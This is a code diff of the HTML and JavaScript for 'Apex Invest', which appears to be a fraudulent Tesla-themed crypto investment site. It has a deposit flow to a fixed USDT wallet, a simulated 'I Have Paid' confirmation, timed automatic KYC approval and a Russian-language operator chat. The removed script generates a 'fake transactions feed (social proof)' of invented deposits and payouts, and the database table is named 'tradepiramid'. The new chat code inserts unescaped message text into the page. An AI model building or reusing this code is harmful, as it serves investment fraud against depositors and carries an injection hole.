@@ -186,18 +186,6 @@
             box-shadow: 0 0 25px rgba(0, 255, 136, 0.5);
         }
 
-        #chat-button.unread::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            right: 2px;
-            width: 14px;
-            height: 14px;
-            background: var(--danger);
-            border: 2px solid var(--bg-color);
-            border-radius: 50%;
-        }
-
         #chat-window {
             position: fixed;
             bottom: 96px;
@@ -236,7 +224,6 @@
             color: #ffffff;
         }
 
-        /* Панель выбора чатов для binarpok@gmail.com */
         .admin-chat-selector {
             background: #111827;
             padding: 8px 12px;
@@ -344,10 +331,6 @@
             transition: background 0.2s;
         }
 
-        .chat-action-btn-yes:hover, .chat-action-btn-human:hover {
-            opacity: 0.85;
-        }
-
         .file-upload-btn {
             background: transparent;
             border: none;
@@ -378,10 +361,6 @@
             font-size: 13px;
         }
 
-        .chat-controls input[type="text"]:focus {
-            border-color: var(--accent);
-        }
-
         .chat-controls button#chat-send-btn {
             padding: 10px 16px;
             background: var(--accent);
@@ -392,10 +371,6 @@
             font-weight: bold;
             font-size: 13px;
             transition: all 0.2s;
-        }
-
-        .chat-controls button#chat-send-btn:hover {
-            box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
         }
 
         footer { text-align: center; padding: 30px 15px; color: var(--text-muted); font-size: 13px; border-top: 1px solid rgba(255, 255, 255, 0.05); margin-top: 40px; }
@@ -432,8 +407,6 @@
 
     <!-- USER DASHBOARD SECTION -->
     <section class="user-dashboard" id="userDashboard">
-        
-        <!-- Main Dashboard View -->
         <div id="dashboardOverview">
             <div class="dashboard-header">
                 <div class="dashboard-user-info">
@@ -497,7 +470,6 @@
             </div>
         </div>
 
-        <!-- View: KYC Verification -->
         <div id="kycView" style="display: none; max-width: 600px; margin: 0 auto;">
             <div class="dash-card" style="padding: 30px;">
                 <h2 style="font-size: 24px; color: #fff; margin-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px;">Identity Verification (KYC)</h2>
@@ -531,7 +503,6 @@
             </div>
         </div>
 
-        <!-- View: Profile Settings -->
         <div id="profileView" style="display: none; max-width: 600px; margin: 0 auto;">
             <div class="dash-card" style="padding: 30px;">
                 <h2 style="font-size: 24px; color: #fff; margin-bottom: 25px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px;">Personal Details</h2>
@@ -566,7 +537,7 @@
         </div>
     </section>
 
-    <!-- MAIN CONTENT (Landing) -->
+    <!-- MAIN PAGE CONTENT -->
     <div id="mainPageContent">
         <section class="hero">
             <h1>Capital of the Future.<br>Investing in <span>Tesla Motors</span></h1>
@@ -736,13 +707,10 @@
     <!-- Modal Window -->
     <div class="modal-overlay" id="paymentModal">
         <div class="modal">
-            <!-- Auth Window -->
             <div id="authContainer" style="display: none;">
                 <h3 id="authTitle">Sign In to Account</h3>
                 <p id="authDesc">Enter your details to access your dashboard</p>
-
                 <div class="auth-success-badge" id="authSuccessBadge">Success!</div>
-
                 <div class="amount-input-group">
                     <label>Email Address:</label>
                     <input type="email" id="authEmail" placeholder="name@example.com">
@@ -751,25 +719,20 @@
                     <label>Password:</label>
                     <input type="password" id="authPassword" placeholder="••••••••">
                 </div>
-
                 <div class="auth-actions-row">
                     <button class="btn" id="authSubmitBtn" onclick="submitAuth()">Sign In</button>
                     <div class="auth-error-badge" id="authErrorBadge">Data Error</div>
                 </div>
-
                 <button class="close-btn" onclick="closeModal()">Close</button>
             </div>
 
-            <!-- Step 1: Amount Input & Method Selection -->
             <div id="stepSelection">
                 <h3 id="modalTitle">Investment</h3>
                 <p id="modalDesc">Enter amount and select payment method</p>
-                
                 <div class="amount-input-group">
                     <label for="investAmount">Investment Amount ($):</label>
                     <input type="number" id="investAmount" min="10" max="10000" oninput="validateAmount()">
                 </div>
-
                 <div class="payment-methods">
                     <button class="pay-btn" onclick="proceedToCheckout('USDT')">Cryptocurrency USDT (TRC20)</button>
                     <button class="pay-btn" onclick="proceedToCheckout('BTC')">Cryptocurrency Bitcoin (BTC)</button>
@@ -779,16 +742,13 @@
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
             </div>
 
-            <!-- Withdrawal Window -->
             <div id="stepWithdraw" style="display: none;">
                 <h3>Withdrawal</h3>
                 <p>Minimum withdrawal amount: $10</p>
-                
                 <div class="amount-input-group">
                     <label>Account Number / Wallet:</label>
                     <input type="text" id="withdrawDestination" placeholder="Enter details">
                 </div>
-
                 <div class="amount-input-group">
                     <label>Payment System:</label>
                     <select id="withdrawSystem">
@@ -797,35 +757,28 @@
                         <option value="Bank Card">Bank Card</option>
                     </select>
                 </div>
-
                 <div class="amount-input-group">
                     <label>Withdrawal Amount ($):</label>
                     <input type="number" id="withdrawAmount" min="10" placeholder="10">
                 </div>
-
                 <button class="btn" onclick="submitWithdrawal()">Request Payout</button>
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
             </div>
 
-            <!-- Step 2: Payment Details -->
             <div class="checkout-box" id="stepCheckout">
                 <h3>Deposit Payment</h3>
                 <p>Transfer the exact amount to the specified details:</p>
-                
                 <div class="invoice-details">
                     <p>Plan: <span><span id="checkPlan">Novice</span></span></p>
                     <p>Amount Due: <span><span id="checkAmount" class="hl">$10</span></span></p>
                     <p>Method: <span><span id="checkMethod">USDT</span></span></p>
                 </div>
-
                 <div class="qr-placeholder">SCAN QR<br><span style="font-size: 8px; font-weight: normal; color: #666;">(For mobile payment)</span></div>
                 <div class="wallet-address" id="checkAddress">TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF</div>
-
                 <button class="btn" onclick="simulateSuccess()">I Have Paid</button>
                 <button class="close-btn" onclick="resetModal()">Back to Methods</button>
             </div>
 
-            <!-- Step 3: Success -->
             <div class="success-screen" id="stepSuccess">
                 <div class="success-icon">&#10004;</div>
                 <h3>Deposit Processing!</h3>
@@ -835,7 +788,6 @@
         </div>
     </div>
 
-    <!-- Custom Alert Modal -->
     <div class="modal-overlay" id="customAlertModal">
         <div class="modal" style="max-width: 380px;">
             <h3 id="customAlertTitle" style="margin-bottom: 12px; color: #fff;">Notification</h3>
@@ -853,7 +805,6 @@
             <button onclick="toggleSupportChat()">✕</button>
         </div>
 
-        <!-- Панель выбора чатов для binarpok@gmail.com -->
         <div class="admin-chat-selector" id="adminChatSelector">
             <label>⚡ Панель Оператора (binarpok)</label>
             <select id="userChatDropdown" onchange="switchAdminTargetChat(this.value)">
@@ -876,7 +827,6 @@
         <p>&copy; 2026 Apex Invest. Architecting the future alongside Tesla Vision.</p>
     </footer>
 
-    <!-- Scripts -->
     <script>
         const SUPABASE_URL = 'https://bycfzzqpnnsqgwtzccdc.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_sYHXSnwWJgT178wtP8MISA_t7A030f2';
@@ -941,17 +891,10 @@
 
         const ADMIN_EMAIL = 'binarpok@gmail.com';
 
-        /* Support Chat Widget & Admin Operator Functions */
         let currentActiveUserSession = '';
         let isBinarpokAdmin = false;
-        let displayedChatCount = 0;
         let selectedImageBase64 = null;
         let isChatOpen = false;
-        let originalPageTitle = document.title;
-
-        // Вставьте сюда ваши реальные данные от @BotFather и Chat ID
-        const TELEGRAM_BOT_TOKEN = 'ВАШ_BOT_TOKEN'; 
-        const TELEGRAM_ADMIN_CHAT_ID = 'ВАШ_CHAT_ID';
 
         function initChatSession() {
             let loggedEmail = localStorage.getItem('apex_logged_user');
@@ -1004,65 +947,59 @@
             loadChatHistory(targetUserSession);
         }
 
-        function loadChatHistory(sessionId) {
+        async function loadChatHistory(sessionId) {
+            try {
+                let response = await fetch(`/api/chat/get?session_id=${sessionId}`);
+                let result = await response.json();
+                if (result.status === 'success') {
+                    renderChatMessages(result.messages);
+                }
+            } catch (e) {
+                console.error('Error loading chat history:', e);
+            }
+        }
+
+        function renderChatMessages(messages) {
             const container = document.getElementById('chatLogs');
             if (!container) return;
             container.innerHTML = '';
 
-            let rawHistory = localStorage.getItem('chat_history_' + sessionId);
-            let history = rawHistory ? JSON.parse(rawHistory) : [];
-
-            if (history.length === 0 && !isBinarpokAdmin) {
-                history.push({
-                    sender: 'admin',
-                    text: '👨‍💻 Поддержка: 💰 **Как вывести средства:** 1. Перейдите в раздел Dashboard. 2. Убедитесь, что ваш KYC (верификация) успешно пройден. 3. Нажмите «Request Withdrawal», выберите платежную систему, укажите реквизиты и сумму (от $10).\n\nВаша проблема решена?',
-                    showButtons: true
+            if (messages.length === 0) {
+                messages.push({
+                    sender: 'support',
+                    text: '👨‍💻 Поддержка: 💰 **Как вывести средства:** 1. Перейдите в раздел Dashboard. 2. Убедитесь, что ваш KYC пройден. 3. Нажмите «Request Withdrawal» (от $10).\n\nВаша проблема решена?',
+                    show_buttons: true
                 });
-                localStorage.setItem('chat_history_' + sessionId, JSON.stringify(history));
             }
 
-            history.forEach(item => {
-                renderChatMessage(item);
+            messages.forEach(item => {
+                const div = document.createElement('div');
+                const senderType = (item.sender === 'admin' || item.sender === 'support') ? 'admin' : 'user';
+                div.className = 'chat-msg ' + senderType;
+                
+                let contentHtml = '';
+                if (item.text) {
+                    contentHtml += `<div>${item.text.replace(/\n/g, '<br>')}</div>`;
+                }
+                if (item.image) {
+                    contentHtml += `<img src="${item.image}" alt="screenshot" onclick="window.open(this.src)">`;
+                }
+
+                div.innerHTML = contentHtml;
+
+                if (item.show_buttons) {
+                    const btnBox = document.createElement('div');
+                    btnBox.className = 'chat-action-buttons';
+                    btnBox.innerHTML = `
+                        <button class="chat-action-btn-yes" onclick="handleChatActionClick('solved_yes')">Да</button>
+                        <button class="chat-action-btn-human" onclick="handleChatActionClick('call_human')">Позвать человека</button>
+                    `;
+                    div.appendChild(btnBox);
+                }
+
+                container.appendChild(div);
             });
-        }
-
-        function renderChatMessage(item) {
-            const container = document.getElementById('chatLogs');
-            if (!container) return;
-            const div = document.createElement('div');
-            const senderType = (item.sender === 'admin' || item.sender === 'support') ? 'admin' : 'user';
-            div.className = 'chat-msg ' + senderType;
-            
-            let contentHtml = '';
-            if (item.text) {
-                contentHtml += `<div>${senderType === 'admin' ? '👨‍💻 Поддержка: ' : ''}${formatMarkdownText(item.text.replace(/\n/g, '<br>'))}</div>`;
-            } else if (senderType === 'admin') {
-                contentHtml += `<div>👨‍💻 Поддержка:</div>`;
-            }
-            
-            if (item.image) {
-                contentHtml += `<img src="${item.image}" alt="screenshot" onclick="window.open(this.src)">`;
-            }
-
-            div.innerHTML = contentHtml;
-
-            if (item.showButtons && !isBinarpokAdmin) {
-                const btnBox = document.createElement('div');
-                btnBox.className = 'chat-action-buttons';
-                btnBox.innerHTML = `
-                    <button class="chat-action-btn-yes" onclick="handleChatActionClick('solved_yes')">Да</button>
-                    <button class="chat-action-btn-human" onclick="handleChatActionClick('call_human')">Позвать человека</button>
-                `;
-                div.appendChild(btnBox);
-            }
-
-            container.appendChild(div);
             container.scrollTop = container.scrollHeight;
-        }
-
-        function formatMarkdownText(txt) {
-            if (!txt) return '';
-            return txt.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
         }
 
         function toggleSupportChat() {
@@ -1070,31 +1007,9 @@
             const isFlex = win.style.display === 'flex';
             win.style.display = isFlex ? 'none' : 'flex';
             isChatOpen = !isFlex;
-
-            if (isChatOpen) {
-                document.getElementById('chat-button').classList.remove('unread');
-                document.title = originalPageTitle;
-                if (isBinarpokAdmin) {
-                    loadAllUserChatsForAdmin();
-                }
+            if (isChatOpen && isBinarpokAdmin) {
+                loadAllUserChatsForAdmin();
             }
-        }
-
-        function playNotificationSound() {
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = ctx.createOscillator();
-                const gain = ctx.createGain();
-                osc.type = 'sine';
-                osc.frequency.setValueAtTime(587.33, ctx.currentTime);
-                osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.15);
-                gain.gain.setValueAtTime(0.1, ctx.currentTime);
-                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
-                osc.connect(gain);
-                gain.connect(ctx.destination);
-                osc.start();
-                osc.stop(ctx.currentTime + 0.3);
-            } catch (e) {}
         }
 
         function handleImageSelect(input) {
@@ -1108,99 +1023,49 @@
             }
         }
 
-        async function sendSupportMessage() {
+        async function sendSupportMessage(actionOverride = null) {
             const input = document.getElementById('chat-message');
-            const text = input.value.trim();
-            if (!text && !selectedImageBase64) return;
+            const text = input ? input.value.trim() : '';
+            const action = actionOverride || null;
+
+            if (!text && !selectedImageBase64 && !action) return;
             if (!currentActiveUserSession && !isBinarpokAdmin) return;
 
-            if (isBinarpokAdmin && !currentActiveUserSession) {
-                showCustomAlert('Пожалуйста, выберите чат пользователя из выпадающего списка сверху!', 'Внимание');
-                return;
-            }
+            if (input) input.value = '';
 
-            input.value = '';
-
-            let rawHistory = localStorage.getItem('chat_history_' + currentActiveUserSession);
-            let history = rawHistory ? JSON.parse(rawHistory) : [];
-
-            if (isBinarpokAdmin) {
-                let newMsg = { sender: 'admin', text: text, image: selectedImageBase64 };
-                history.push(newMsg);
-                localStorage.setItem('chat_history_' + currentActiveUserSession, JSON.stringify(history));
-                renderChatMessage(newMsg);
-            } else {
-                let newMsg = { sender: 'user', text: text, image: selectedImageBase64 };
-                history.push(newMsg);
-
-                const lower = text.toLowerCase();
-                if (lower === 'нет' || lower === 'нет.') {
-                    history.push({
-                        sender: 'admin',
-                        text: 'Сожалеем, что проблема не решена. Как вы хотите продолжить?',
-                        showButtons: true
-                    });
-                } else if (lower === 'да' || lower === 'да.') {
-                    history.push({
-                        sender: 'admin',
-                        text: 'Рады были помочь! Если у вас возникнут еще вопросы, просто напишите их сюда.'
-                    });
-                } else {
-                    history.push({
-                        sender: 'admin',
-                        text: 'Я получил ваше сообщение. Чем еще могу помочь по работе Apex Invest?',
-                        showButtons: true
-                    });
+            try {
+                let response = await fetch('/api/chat/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: currentActiveUserSession,
+                        message: text,
+                        image: selectedImageBase64,
+                        action: action
+                    })
+                });
+                let result = await response.json();
+                if (result.status === 'success') {
+                    renderChatMessages(result.messages);
                 }
-
-                localStorage.setItem('chat_history_' + currentActiveUserSession, JSON.stringify(history));
-                loadChatHistory(currentActiveUserSession);
+            } catch (error) {
+                console.error('Network error:', error);
             }
 
             selectedImageBase64 = null;
-            document.getElementById('chat-file-input').value = '';
-            document.querySelector('.file-upload-btn').style.color = '';
+            const fileInput = document.getElementById('chat-file-input');
+            if (fileInput) fileInput.value = '';
+            const uploadBtn = document.querySelector('.file-upload-btn');
+            if (uploadBtn) uploadBtn.style.color = '';
         }
 
         function handleChatActionClick(actionType) {
             if (actionType === 'solved_yes') {
-                sendSupportMessageText('Да');
+                sendSupportMessage('solved_yes');
             } else if (actionType === 'call_human') {
-                sendSupportMessageText('Позвать человека');
-                
-                // Получаем почту текущего пользователя или сессию
-                let userEmail = localStorage.getItem('apex_logged_user');
-                let userInfo = userEmail ? userEmail : ('Аноним (сессия: ' + currentActiveUserSession + ')');
-                
-                let msgText = `🚨 <b>Пользователь зовет оператора!</b>\n\n📧 Почта: <code>${userInfo}</code>`;
-                sendNotificationToTelegramAdmin(msgText);
+                sendSupportMessage('call_human');
             }
         }
-
-        function sendSupportMessageText(text) {
-            document.getElementById('chat-message').value = text;
-            sendSupportMessage();
-        }
-
-        function sendNotificationToTelegramAdmin(msgText) {
-            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'ВАШ_BOT_TOKEN') return;
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_ADMIN_CHAT_ID,
-                    text: msgText,
-                    parse_mode: 'HTML'
-                })
-            }).catch(err => console.error('Telegram notification error:', err));
-        }
-
-        window.addEventListener('focus', () => {
-            if (isChatOpen) {
-                document.title = originalPageTitle;
-                document.getElementById('chat-button').classList.remove('unread');
-            }
-        });
 
         function showCustomAlert(text, title = 'Notification') {
             document.getElementById('customAlertTitle').innerText = title;
@@ -1628,18 +1493,6 @@
             saveToSupabase(email, userData);
             loadUserData(email);
 
-            if (typeof pushPublicTransaction === 'function') {
-                const u = (profileName && profileName.innerText) ? profileName.innerText.split('@')[0] : (email || 'user');
-                pushPublicTransaction({
-                    type: 'PAYOUT',
-                    user: maskPublicName(u),
-                    amount: amount,
-                    method: system,
-                    status: 'Sent',
-                    real: true
-                });
-            }
-
             showCustomAlert(`Withdrawal request for $${amount} successfully created!`, 'Success');
             closeModal();
         }
@@ -1917,7 +1770,6 @@
 
             const email = localStorage.getItem('apex_logged_user');
             const amount = parseFloat(investAmountInput.value);
-            const userText = profileName.innerText ? profileName.innerText.split('@')[0] : 'user';
             
             let userData = getCleanUserData(localStorage.getItem('user_data_' + email));
 
@@ -1947,17 +1799,6 @@
             localStorage.setItem('user_data_' + email, JSON.stringify(userData));
             saveToSupabase(email, userData);
             loadUserData(email);
-
-            if (typeof pushPublicTransaction === 'function') {
-                pushPublicTransaction({
-                    type: 'DEPOSIT',
-                    user: maskPublicName(userText || email),
-                    amount: amount,
-                    method: currentMethodName,
-                    status: 'Completed',
-                    real: true
-                });
-            }
         }
 
         function resetModal() {
@@ -1973,229 +1814,6 @@
                 closeCustomAlert();
             }
         }
-
-        setInterval(() => {
-            let email = localStorage.getItem('apex_logged_user');
-            if (!email) return;
-
-            let rawData = localStorage.getItem('user_data_' + email);
-            if (!rawData) return;
-            let userData = getCleanUserData(rawData);
-
-            let now = Date.now();
-
-            if (userData.kyc && userData.kyc.status === 'pending' && userData.kyc.approveAt) {
-                if (now >= userData.kyc.approveAt) {
-                    userData.kyc.status = 'verified';
-                    delete userData.kyc.approveAt;
-                    
-                    localStorage.setItem('user_data_' + email, JSON.stringify(userData));
-                    saveToSupabase(email, userData);
-                    loadUserData(email);
-                    showCustomAlert('Congratulations! Your identity verification (KYC) has been successfully confirmed.', 'Success');
-                    return;
-                }
-            }
-
-            const timers = document.querySelectorAll('.tx-timer');
-            timers.forEach(timerEl => {
-                let targetTime = parseInt(timerEl.getAttribute('data-target'));
-                let distance = targetTime - now;
-
-                if (distance <= 0) {
-                    loadUserData(email);
-                } else {
-                    let totalHours = Math.floor(distance / (1000 * 60 * 60));
-                    let remainingDays = Math.floor(totalHours / 24);
-                    let remainingHours = totalHours % 24;
-
-                    if (remainingDays > 0) {
-                        timerEl.innerText = `${remainingDays}d ${remainingHours}h`;
-                    } else {
-                        let remainingMins = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                        timerEl.innerText = `${remainingHours}h ${remainingMins}m`;
-                    }
-                }
-            });
-        }, 1000);
-    </script>
-    <script>
-        /* ===== Live fake transactions feed (social proof) ===== */
-        function maskPublicName(raw) {
-            if (!raw) return 'user***00';
-            let s = String(raw).replace(/@.*/, '').replace(/[^a-zA-Z0-9]/g, '');
-            if (s.length < 2) s = 'user';
-            const keep = Math.min(4, s.length);
-            const suf = String(Math.floor(10 + Math.random() * 89));
-            return s.slice(0, keep).toLowerCase() + '***' + suf;
-        }
-
-        function pushPublicTransaction(tx) {
-            const tbody = document.getElementById('historyTableBody');
-            if (!tbody || !tx) return;
-            const isDep = (tx.type === 'DEPOSIT');
-            const tr = document.createElement('tr');
-            tr.className = 'tx-new';
-            if (tx.real) tr.setAttribute('data-real', '1');
-            const amountStr = (typeof tx.amount === 'number') ? ('$' + tx.amount) : String(tx.amount);
-            tr.innerHTML =
-                '<td><span class="' + (isDep ? 'badge-deposit' : 'badge-payout') + '">' + (tx.type || 'DEPOSIT') + '</span></td>' +
-                '<td>' + (tx.user || 'user***00') + '</td>' +
-                '<td style="font-weight: 600;">' + amountStr + '</td>' +
-                '<td>' + (tx.method || '—') + '</td>' +
-                '<td style="color: var(--accent); font-weight: 600;">' + (tx.status || 'Completed') + '</td>';
-            tbody.insertBefore(tr, tbody.firstChild);
-            while (tbody.children.length > 3) {
-                let removed = false;
-                for (let i = tbody.children.length - 1; i >= 0; i--) {
-                    if (tbody.children[i].getAttribute('data-real') !== '1') {
-                        tbody.removeChild(tbody.children[i]);
-                        removed = true;
-                        break;
-                    }
-                }
-                if (!removed) tbody.removeChild(tbody.lastChild);
-            }
-            setTimeout(function() { tr.classList.remove('tx-new'); }, 800);
-        }
-
-        (function initLiveTransactions() {
-            const NAMES = [
-                'alex','crypto','invest','max','anna','serg','dima','kate','john','mike',
-                'lena','ivan','roma','nina','paul','olga','art','vlad','tina','den',
-                'mark','sofia','leo','kira','nik','eva','dan','mira','tony','lara'
-            ];
-            const SUFFIXES = ['99','77','21','07','88','42','13','56','03','19','64','11'];
-            const METHODS_DEP = [
-                function() { return 'USDT TRC20 (T' + randHex(3) + '...' + randHex(5) + ')'; },
-                function() { return 'Bitcoin (1' + randHex(3) + '...' + randHex(3) + ')'; },
-                function() { return 'Ethereum (0x' + randHex(4) + '...' + randHex(4) + ')'; },
-                function() { return 'Bank Card (4276***' + Math.floor(10 + Math.random() * 89) + ')'; }
-            ];
-            const METHODS_OUT = [
-                function() { return 'USDT TRC20 (T' + randHex(3) + '...' + randHex(5) + ')'; },
-                function() { return 'Bitcoin (1' + randHex(3) + '...' + randHex(3) + ')'; },
-                function() { return 'Bank Card (5469***' + Math.floor(10 + Math.random() * 89) + ')'; },
-                function() { return 'Ethereum (0x' + randHex(3) + '...' + randHex(4) + ')'; }
-            ];
-            const DEP_AMOUNTS = [25, 30, 50, 75, 90, 100, 120, 150, 200, 250, 300, 400, 500, 750, 1000, 50, 80, 110];
-            const OUT_AMOUNTS = [18, 35, 45, 60, 80, 95, 120, 150, 180, 220, 280, 350, 75, 90];
-
-            function randHex(n) {
-                const c = 'abcdef0123456789';
-                let s = '';
-                for (let i = 0; i < n; i++) s += c[Math.floor(Math.random() * c.length)];
-                return s;
-            }
-            function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
-            function maskName() {
-                const n = randItem(NAMES);
-                const suf = randItem(SUFFIXES);
-                return n.slice(0, Math.min(4, n.length)) + '***' + suf;
-            }
-            function appendFakeTx() {
-                const isDep = Math.random() < 0.62;
-                pushPublicTransaction({
-                    type: isDep ? 'DEPOSIT' : 'PAYOUT',
-                    user: maskName(),
-                    amount: isDep ? randItem(DEP_AMOUNTS) : randItem(OUT_AMOUNTS),
-                    method: isDep ? randItem(METHODS_DEP)() : randItem(METHODS_OUT)(),
-                    status: isDep ? (Math.random() < 0.85 ? 'Completed' : 'Processing') : (Math.random() < 0.8 ? 'Sent' : 'Processing'),
-                    real: false
-                });
-            }
-
-            var seenRealKeys = {};
-            async function pullRealFromSupabase() {
-                if (!supabaseClient) return;
-                try {
-                    var res = await supabaseClient.from('tradepiramid').select('username,user_data').limit(40);
-                    if (!res || !res.data) return;
-                    var candidates = [];
-                    res.data.forEach(function(row) {
-                        var ud = row.user_data;
-                        try { if (typeof ud === 'string') ud = JSON.parse(ud); } catch (e) { return; }
-                        if (!ud || !Array.isArray(ud.transactions)) return;
-                        var uname = row.username || 'user';
-                        ud.transactions.slice(0, 3).forEach(function(tx) {
-                            if (!tx || !tx.type) return;
-                            var key = uname + '|' + tx.type + '|' + tx.amount + '|' + (tx.date || '') + '|' + (tx.startDate || '');
-                            if (seenRealKeys[key]) return;
-                            var isDep = tx.type === 'DEPOSIT';
-                            var isOut = tx.type === 'WITHDRAWAL' || tx.type === 'PAYOUT';
-                            if (!isDep && !isOut) return;
-                            candidates.push({
-                                key: key,
-                                type: isDep ? 'DEPOSIT' : 'PAYOUT',
-                                user: maskPublicName(uname),
-                                amount: tx.amount,
-                                method: tx.method || 'USDT TRC20',
-                                status: isDep ? 'Completed' : (tx.status === 'Processing' ? 'Processing' : 'Sent'),
-                                real: true,
-                                ts: tx.startDate || 0
-                            });
-                        });
-                    });
-                    candidates.sort(function(a, b) { return (b.ts || 0) - (a.ts || 0); });
-                    for (var i = 0; i < candidates.length; i++) {
-                        var c = candidates[i];
-                        if (seenRealKeys[c.key]) continue;
-                        seenRealKeys[c.key] = true;
-                        pushPublicTransaction(c);
-                        break;
-                    }
-                } catch (e) {
-                    console.warn('pullRealFromSupabase', e);
-                }
-            }
-
-            function scheduleNext() {
-                var delay = 5000 + Math.floor(Math.random() * 5000);
-                setTimeout(function() {
-                    if (Math.random() < 0.35) {
-                        pullRealFromSupabase();
-                    } else {
-                        appendFakeTx();
-                    }
-                    scheduleNext();
-                }, delay);
-            }
-            setTimeout(function() {
-                pullRealFromSupabase();
-                setTimeout(appendFakeTx, 4000);
-                scheduleNext();
-            }, 2500);
-        })();
-
-        (function updateOperationDays() {
-            var LAUNCH = new Date('2026-01-16T00:00:00Z');
-            function render() {
-                var el = document.getElementById('statDays');
-                if (!el) return;
-                var now = new Date();
-                var days = Math.floor((now - LAUNCH) / 86400000);
-                if (days < 1) days = 1;
-                el.textContent = days + ' Days';
-            }
-            render();
-            setInterval(render, 60 * 60 * 1000);
-        })();
-
-        if ('scrollRestoration' in history) {
-            history.scrollRestoration = 'manual';
-        }
-
-        document.addEventListener("DOMContentLoaded", function() {
-            let scrollPosition = sessionStorage.getItem("scrollPosition");
-            if (scrollPosition !== null) {
-                window.scrollTo(0, parseInt(scrollPosition));
-                sessionStorage.removeItem("scrollPosition");
-            }
-        });
-
-        window.addEventListener("beforeunload", function() {
-            sessionStorage.setItem("scrollPosition", window.scrollY);
-        });
     </script>
 </body>
 </html>
